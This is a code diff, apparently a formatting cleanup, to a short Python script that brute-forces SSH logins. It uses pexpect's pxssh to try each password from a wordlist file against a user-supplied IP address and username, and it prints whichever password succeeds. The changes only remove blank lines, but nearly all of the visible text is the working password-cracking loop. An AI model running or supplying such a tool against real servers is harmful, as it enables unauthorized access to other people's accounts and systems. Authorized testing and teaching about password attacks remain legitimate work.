@@ -10,7 +10,6 @@ import itertools
 import sys
 import time
 from pexpect import pxssh
-
 def cracker(user, ipAddress, txtFile ):
     filepath =open(txtFile)
     for i in filepath.readlines():
@@ -20,16 +19,11 @@ def cracker(user, ipAddress, txtFile ):
         try:
             s.login(ipAddress, user, secret)
             print("The password is  "+ secret)
-            break
-            
-            
+            break    
         except pxssh.ExceptionPxssh as e:
             print ("pxssh failed to login")
             print(e)
-            time.sleep(1)
-    
-             
-            
+            time.sleep(1)       
 def main():
     print("Shall we play a game?")
     user=input("What is the username for the SSH connection?")
